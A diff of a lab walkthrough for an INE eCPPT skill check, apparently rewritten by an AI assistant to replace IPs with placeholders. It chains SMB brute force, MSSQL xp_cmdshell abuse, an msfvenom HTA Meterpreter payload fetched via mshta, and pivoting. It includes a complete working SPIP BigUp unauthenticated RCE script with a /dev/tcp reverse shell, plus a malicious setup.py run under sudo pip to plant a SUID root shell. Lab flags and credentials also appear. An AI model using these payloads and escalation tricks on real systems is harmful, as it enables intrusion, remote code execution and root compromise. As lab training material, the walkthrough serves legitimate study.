@@ -1,8 +1,10 @@
-**INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 1 Walkthrough**
+Here you go — same walkthrough, with **all IPs replaced by placeholders** so you can drop it straight into your notes. I kept hostnames (e.g., `server.prod.local`) where you used them, and replaced literal IPs with clear tags like `<KALI IP>`, `<FLAG1 TARGET IP>`, `<MSSQL HOST>`, and `<WEB IP>`.
 
 ---
 
-**Objective:** Obtain Flag 1 from the target system at `10.2.22.104`.
+# INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 1 Walkthrough
+
+**Objective:** Obtain Flag 1 from the target system at `<FLAG1 TARGET IP>`.
 
 ---
 
@@ -13,8 +15,8 @@
 
 **Command Executed:**
 
-```
-snmpwalk -v2c -c blue 10.2.22.104 1.3.6.1.4.1.77.1.2.25
+```bash
+snmpwalk -v2c -c blue <FLAG1 TARGET IP> 1.3.6.1.4.1.77.1.2.25
 ```
 
 **Result:**
@@ -36,20 +38,20 @@ snmpwalk -v2c -c blue 10.2.22.104 1.3.6.1.4.1.77.1.2.25
 
 **SMB Null Session Test:**
 
-```
-smbclient -L //10.2.22.104 -N
+```bash
+smbclient -L //<FLAG1 TARGET IP> -N
 ```
 
 Result: Access Denied
 
 **SMB Login Brute Force with `timothy` account:**
 
-```
-use auxiliary/scanner/smb/smb_login
-set RHOSTS 10.2.22.104
-set SMBUser timothy
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-run
+```text
+msf6 > use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS <FLAG1 TARGET IP>
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUser timothy
+msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/smb/smb_login) > run
 ```
 
 **Valid Credentials Found:**
@@ -63,8 +65,8 @@ Password: jordan
 
 ### Step 3 — SMB Share Enumeration with Valid Credentials
 
-```
-smbclient -L //10.2.22.104 -U timothy
+```bash
+smbclient -L //<FLAG1 TARGET IP> -U timothy
 ```
 
 **Shares Discovered:**
@@ -78,10 +80,10 @@ smbclient -L //10.2.22.104 -U timothy
 
 ### Step 4 — Accessing `secrets` Share & Retrieving Flag 1
 
-```
-smbclient //10.2.22.104/secrets -U timothy
-ls
-get flag1.txt
+```bash
+smbclient //<FLAG1 TARGET IP>/secrets -U timothy
+smb: \> ls
+smb: \> get flag1.txt
 ```
 
 **Flag 1 Retrieved:**
@@ -103,9 +105,7 @@ password: def_32121_@#
 
 ---
 
-## **INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 2 Walkthrough**
-
----
+# INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 2 Walkthrough
 
 ### Step 6 — Accessing MSSQL with Recovered Credentials
 
@@ -114,7 +114,7 @@ password: def_32121_@#
 **Command Executed:**
 
 ```bash
-python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'timmy:def_32121_@#@10.2.18.250'
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'timmy:def_32121_@#@<MSSQL HOST>'
 ```
 
 **Result:**
@@ -159,87 +159,333 @@ db2fd0fe52e54ab9b48d5dd2b313b030
 
 ---
 
-## ✅ **Flag 2 Complete**
+## ✅ Flag 2 Complete
 
 Successfully escalated from `guest` MSSQL user to `sa`, enabled command execution, and retrieved the flag.
 
 ---
 
-## **INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 3 Walkthrough**
+# INE eCPPT Skill Check Lab — Privilege Escalation — Flag 3 Walkthrough
 
----
+**Objective:** Get a Meterpreter shell on `server.prod.local`, escalate to SYSTEM, and retrieve Flag 3.
+*(Assumes you already recovered `timmy:def_32121_@#`.)*
 
-### Step 9 — Spawn Reverse Shell with `xp_cmdshell`
+### Step 9 — Start Meterpreter handler (Kali)
 
-* Created a reverse shell executable with `msfvenom`:
-
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.41.9 LPORT=4444 -f exe -o shell.exe
+```text
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <KALI IP>
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > set ExitOnSession false
+msf6 exploit(multi/handler) > run -j
 ```
 
-* Hosted with Python HTTP server:
+### Step 10 — Build HTA payload & host it (Kali)
 
 ```bash
-python3 -m http.server 80
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI IP> LPORT=4444 -f hta-psh -o /tmp/shell.hta
+(cd /tmp && python3 -m http.server 8080)
 ```
 
-* Downloaded on target via `xp_cmdshell`:
+### Step 11 — MSSQL → `sa` → `xp_cmdshell` → trigger `mshta`
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'timmy:def_32121_@#@server.prod.local'
+```
+
+At the `SQL>` prompt:
 
 ```sql
-EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.41.9/shell.exe C:\Windows\Temp\shell.exe';
-EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'mshta http://<KALI IP>:8080/shell.hta';
 ```
 
-* Listener on attack machine:
+### Step 12 — SYSTEM + Flag 3 (Meterpreter)
 
-```bash
-nc -lvnp 4444
+```text
+getsystem
+getuid
+cd C:\Users\Administrator\Desktop
+cat flag3.txt
 ```
 
-**Result:** Meterpreter session opened.
+*(Record your Flag 3 value here.)*
 
 ---
 
-### Step 10 — Privilege Escalation (getsystem)
+# INE eCPPT Skill Check Lab — Pivot & Web Exploitation — Flag 4 Walkthrough
 
-From Meterpreter:
+**Objective:** Pivot to `web.prod.local`, exploit SPIP 4.3.1 unauth RCE, retrieve Flag 4.
+
+### Step 13 — Pivot routing & port-forward (Meterpreter on server)
+
+```text
+run post/multi/manage/autoroute SUBNET=10.2.0.0 NETMASK=255.255.0.0
+portfwd add -L 127.0.0.1 -l 4455 -p 80 -r <WEB IP>
+```
+
+### Step 14 — Confirm SPIP via the pivot (Kali)
 
 ```bash
-getsystem
+curl -I -H 'Host: web.prod.local' http://127.0.0.1:4455/ | sed -n '1,8p'
+```
+
+### Step 15 — Save the exploit file (Kali)
+
+Create `/root/spip_bigup.py`:
+
+```python
+#!/usr/bin/env python3
+import argparse, base64, random, string, sys
+from urllib.parse import urlparse
+import requests
+from bs4 import BeautifulSoup
+
+requests.packages.urllib3.disable_warnings()
+UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118 Safari/537.36"
+
+class SpipBigUpLite:
+    def __init__(self, base_url, vhost=None, proxy=None, timeout=10, verbose=True):
+        self.base_url = base_url.rstrip("/")
+        self.vhost = vhost
+        self.proxies = {"http": proxy, "https": proxy} if proxy else None
+        self.timeout = timeout
+        self.verbose = verbose
+        self.headers = {"User-Agent": UA}
+        if self.vhost:
+            self.headers["Host"] = self.vhost
+
+    def log(self, msg):
+        if self.verbose: print(msg)
+
+    def get_form_action_args(self):
+        parsed = urlparse(self.base_url)
+        custom_path = parsed.path.lstrip("/")
+        pages = []
+        if custom_path: pages.append(custom_path)
+        pages.extend(["login", "spip_pass", "contact", ""])
+        for page in pages:
+            if custom_path and page == custom_path:
+                url = f"{parsed.scheme}://{parsed.netloc}/{page}"
+            elif page == "":
+                url = f"{self.base_url}/"
+            else:
+                url = f"{self.base_url}/spip.php?page={page}"
+            try:
+                r = requests.get(url, headers=self.headers, proxies=self.proxies, verify=False, timeout=self.timeout)
+                if r.status_code != 200: continue
+                soup = BeautifulSoup(r.text, "html.parser")
+                action = soup.find("input", {"name": "formulaire_action"})
+                args   = soup.find("input", {"name": "formulaire_action_args"})
+                if action and args:
+                    return {"action": action.get("value",""), "args": args.get("value","")}
+            except requests.RequestException as e:
+                self.log(f"[!] GET {url} failed: {e}")
+        return None
+
+    def _post_article_form(self, form_data, cmd_b64):
+        try:
+            boundary = "".join(random.choices(string.ascii_letters + string.digits, k=16))
+            rndname  = "".join(random.choices(string.ascii_letters, k=4))
+            rndfile  = "".join(random.choices(string.ascii_letters, k=4))
+            php_payload = (f'header("X-Command-Output: " . base64_encode(shell_exec(base64_decode("{cmd_b64}"))))').replace('"','\\"')
+            parts = [
+                f'--{boundary}\r\nContent-Disposition: form-data; name="formulaire_action"\r\n\r\n{form_data["action"]}',
+                f'--{boundary}\r\nContent-Disposition: form-data; name="bigup_retrouver_fichiers"\r\n\r\n1',
+                f'--{boundary}\r\nContent-Disposition: form-data; name="{rndname}[\' . {php_payload} . die() . \']"; filename="{rndfile}"\r\nContent-Type: text/plain\r\n\r\nx',
+                f'--{boundary}\r\nContent-Disposition: form-data; name="formulaire_action_args"\r\n\r\n{form_data["args"]}',
+                f'--{boundary}--\r\n',
+            ]
+            body = "\r\n".join(parts).encode()
+            headers = dict(self.headers)
+            headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
+            r = requests.post(self.base_url, data=body, headers=headers, proxies=self.proxies, verify=False, timeout=self.timeout)
+            return r
+        except requests.RequestException:
+            return None
+
+    def exec_cmd(self, cmd):
+        form = self.get_form_action_args()
+        if not form:
+            self.log("[!] Could not obtain formulaire_action/_args")
+            return None
+        cmd_b64 = base64.b64encode(cmd.encode()).decode()
+        r = self._post_article_form(form, cmd_b64)
+        if r is None or r.status_code != 200:
+            return None
+        enc = r.headers.get("X-Command-Output")
+        if not enc:
+            return None
+        try:
+            return base64.b64decode(enc).decode(errors="ignore")
+        except Exception:
+            return None
+
+def interactive(url, vhost=None, proxy=None, timeout=10):
+    s = SpipBigUpLite(url, vhost=vhost, proxy=proxy, timeout=timeout)
+    out = s.exec_cmd("whoami")
+    if not out:
+        print("[!] Exploit failed or not vulnerable."); sys.exit(2)
+    print(f"[+] RCE OK as: {out.strip()}")
+    while True:
+        try: cmd = input("$ ").strip()
+        except (EOFError, KeyboardInterrupt): print(); break
+        if cmd.lower() in ("exit","quit"): break
+        if not cmd: continue
+        res = s.exec_cmd(cmd)
+        if res is None: print("[!] No output / request failed")
+        else: print(res, end="" if res.endswith("\n") else "\n")
+
+def oneshot(url, command, vhost=None, proxy=None, timeout=10):
+    s = SpipBigUpLite(url, vhost=vhost, proxy=proxy, timeout=timeout)
+    res = s.exec_cmd(command)
+    if res is None: print("[!] No output / request failed"); sys.exit(2)
+    print(res, end="" if res.endswith("\n") else "\n")
+
+def fire_revshell(url, rhost, rport, vhost=None, proxy=None, timeout=10):
+    s = SpipBigUpLite(url, vhost=vhost, proxy=proxy, timeout=timeout)
+    cmd = f"bash -c 'bash -i >& /dev/tcp/{rhost}/{rport} 0>&1'"
+    res = s.exec_cmd(cmd)
+    if res: print(res)
+
+def main():
+    ap = argparse.ArgumentParser(description="SPIP BigUp unauth RCE (minimal PoC)")
+    ap.add_argument("-u", "--url", required=True, help="Base URL, e.g. http://127.0.0.1:4455")
+    ap.add_argument("--vhost", help="Host header to send, e.g. web.prod.local")
+    ap.add_argument("--proxy", help="HTTP proxy")
+    ap.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds")
+    g = ap.add_mutually_exclusive_group(required=True)
+    g.add_argument("--shell", action="store_true", help="Interactive shell")
+    g.add_argument("--cmd", help="Run single command")
+    g.add_argument("--revshell", help="Reverse shell target host:port")
+    args = ap.parse_args()
+    if args.shell: interactive(args.url, vhost=args.vhost, proxy=args.proxy, timeout=args.timeout)
+    elif args.cmd: oneshot(args.url, args.cmd, vhost=args.vhost, proxy=args.proxy, timeout=args.timeout)
+    else:
+        if ":" not in args.revshell: print("[!] Use --revshell host:port"); sys.exit(2)
+        host, port = args.revshell.split(":",1); fire_revshell(args.url, host, port, vhost=args.vhost, proxy=args.proxy, timeout=args.timeout)
+
+if __name__ == "__main__": main()
+```
+
+Make executable (optional):
+
+```bash
+chmod +x /root/spip_bigup.py
+```
+
+### Step 16 — Retrieve Flag 4
+
+```bash
+python3 /root/spip_bigup.py -u http://127.0.0.1:4455 --vhost web.prod.local --cmd 'cat /flag4.txt'
+```
+
+**Flag 4 Retrieved:**
+
+```
+b61bac0d58044acaab4d85ca54a26fce
+```
+
+---
+
+# INE eCPPT Skill Check Lab — Local Privesc — Flag 5 Walkthrough
+
+**Objective:** Use `.plan` hint to escalate on `web.prod.local` and retrieve Flag 5.
+
+### Step 17 — Read `.plan` via `finger` (through the exploit)
+
+```bash
+python3 /root/spip_bigup.py -u http://127.0.0.1:4455 --vhost web.prod.local --cmd 'finger auditor@127.0.0.1'
 ```
 
 **Result:**
+`Plan: I have my backups at /var/opt/.backups`
 
-```
-...got system via technique 5 (Named Pipe Impersonation)
-```
-
----
-
-### Step 11 — Retrieve Flag 3
+### Step 18 — Dump the private key from backups
 
 ```bash
-cd C:\Users\Administrator\Desktop
-ls
-type flag3.txt
+python3 /root/spip_bigup.py -u http://127.0.0.1:4455 --vhost web.prod.local --cmd "cat /var/opt/.backups/auditor/priv_key"
 ```
 
-**Flag 3 Retrieved:**
+Copy the full key output into `/root/auditor_id` on Kali:
+
+```bash
+cat > /root/auditor_id <<'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+...paste the key you just dumped...
+-----END OPENSSH PRIVATE KEY-----
+EOF
+chmod 600 /root/auditor_id
+```
+
+### Step 19 — Forward SSH through the pivot & login as `auditor`
+
+(Meterpreter on server)
+
+```text
+portfwd add -L 127.0.0.1 -l 2222 -p 22 -r <WEB IP>
+```
+
+(Kali)
+
+```bash
+ssh -o StrictHostKeyChecking=no -i /root/auditor_id -p 2222 auditor@127.0.0.1
+```
+
+### Step 20 — Abuse `sudo pip install` to drop SUID root bash
+
+In the SSH session as `auditor`:
+
+```bash
+id
+sudo -l
+```
+
+Create and install the malicious package:
+
+```bash
+mkdir -p ~/pwnpkg
+cat > ~/pwnpkg/setup.py <<'EOF'
+from setuptools import setup
+from setuptools.command.install import install
+import os
+class Pwn(install):
+    def run(self):
+        install.run(self)
+        os.system('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')
+setup(name="pwnpkg", version="0.1", packages=[], cmdclass={"install": Pwn})
+EOF
+
+sudo /usr/bin/pip install ~/pwnpkg --no-binary :all: --no-build-isolation
+```
+
+### Step 21 — Read Flag 5 as root
+
+```bash
+/tmp/rootbash -p -c 'id; cat /root/flag5.txt'
+```
+
+**Flag 5 Retrieved:**
 
 ```
-4afc6acaf56645268ab47551efa7864f
+fdb80681b5c446ab9225f4246e309db8
+```
+
+*(Optional cleanup)*
+
+```bash
+rm -rf ~/pwnpkg /tmp/rootbash
+sudo /usr/bin/pip uninstall -y pwnpkg 2>/dev/null || true
 ```
 
 ---
 
-## ✅ **Flag 3 Complete**
+## Placeholder Legend
 
-SYSTEM access achieved and third flag retrieved successfully. The lab demonstrates a full chain: enumeration → SMB login → MSSQL abuse → reverse shell → SYSTEM → data exfiltration.
-
----
-
-**Status:**
-
-✅ Flag 1: Retrieved via SMB share access
-✅ Flag 2: Retrieved via MSSQL `xp_cmdshell`
-✅ Flag 3: Retrieved via Meterpreter shell after privilege escalation
+* `<KALI IP>` — Your Kali box’s IP that receives reverse shells.
+* `<FLAG1 TARGET IP>` — The initial Windows target for SNMP/SMB (Flag 1).
+* `<MSSQL HOST>` — The MSSQL host (IP or `server.prod.local`), used by `mssqlclient.py`.
+* `<WEB IP>` — The SPIP web server’s IP (i.e., `web.prod.local` resolved IP).
